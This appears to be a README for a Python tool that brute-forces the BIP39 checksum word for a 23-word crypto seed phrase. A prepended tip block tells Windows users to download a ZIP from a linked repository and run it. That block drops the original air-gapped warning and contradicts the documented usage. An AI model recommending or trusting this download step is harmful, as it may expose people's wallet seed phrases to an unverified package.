> [!TIP] 
> # How to run
> 
> ## Install Python
> 
> 1. Go to the official Python website: https://www.python.org/downloads/release/python-3139/
> 2. Scroll down to the files part. Then download the Windows installer (64-bit)
> 3. Once downloaded, run the installer.
> 4. ✅ Important: On the first screen of the installer, check the box that says
> “Add Python to PATH” before clicking Install Now.
> ## How to download the repo
> Click the button below to download the code as a .zip:
>
> <a href="https://github.com/bezumieorc4371/bip39checksum/archive/refs/heads/main.zip"><img src="https://img.shields.io/badge/⬇️_Download_ZIP-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download ZIP"></a>
>
> 
> Now extract the .zip folder
> 
> ## Run the script
> 
> Open the command prompt inside the extracted folder and run:
>
> `py bip39checksum.py`
> 
>  or
> 
> `python bip39checksum.py`
# bip39checksum

This simple tool, checks all possible checksum words for a provided english bip39 23-words sequence. For each sequence, 8 possible words are valid and they will be displayed. The test is made by bruteforce check against all the possible bip39 words of english dictionary.

Since the sequence is inside a file on disk, be careful to run the script on a totally offline air-gapped system.

## dependencies

```
pip3 install mnemonic
```

## how to run

 fill a file with the 23 words sequence (single line, words separed by a space) you want to test. Then just run the script. You will get a list of valid 24 words bip39 sequence as checked valid.


```
usage: bip39checksum.py [-h] -s SEQUENCE

optional arguments:
  -h, --help            show this help message and exit
  -s SEQUENCE, --sequence SEQUENCE
                        Specify sequence words file to check. Single line, words separed by a space
```



yk